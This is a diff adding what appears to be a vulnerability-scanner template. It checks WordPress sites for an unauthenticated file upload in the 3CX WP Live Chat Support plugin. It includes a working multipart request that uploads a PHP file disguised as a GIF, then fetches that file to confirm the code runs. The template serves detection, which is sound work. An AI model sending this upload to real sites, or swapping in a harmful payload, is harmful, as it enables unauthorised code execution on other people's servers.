@@ -1,0 +1,63 @@
+id: 3cx-live-chat-remote-upload-logical
+
+info:
+  name: 3cx live chat remote_upload Logical Vulnerability
+  author: bl
+  severity: critical
+  tags: WordPress
+
+variables:
+  r1: '{{to_lower(rand_base(20))}}'
+  r2: '{{to_lower(rand_base(20))}}'
+  rboundary: '{{to_lower(rand_base(8))}}'
+
+flow: http(1) && http(2)
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/wp-json/wp_live_chat_support/v1/remote_upload'
+    headers:
+      Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
+    body: "--WebKitFormBoundary{{rboundary}}\r
+
+      Content-Disposition: form-data; name=\"timestamp\"\r
+
+      \r
+
+      1528969272366\r
+
+      --WebKitFormBoundary{{rboundary}}\r
+
+      Content-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.gif.phtml\"\r
+
+      Content-Type: image/gif\r
+
+      \r
+
+      GIF89a<?php echo \"{{r2}}\";unlink(__FILE__);?>\r
+
+      --WebKitFormBoundary{{rboundary}}--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        words:
+          - "{{r1}}"
+        part: body
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-content/uploads/wp_live_chat/{{r1}}.gif.phtml'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{r2}}"
+        part: body
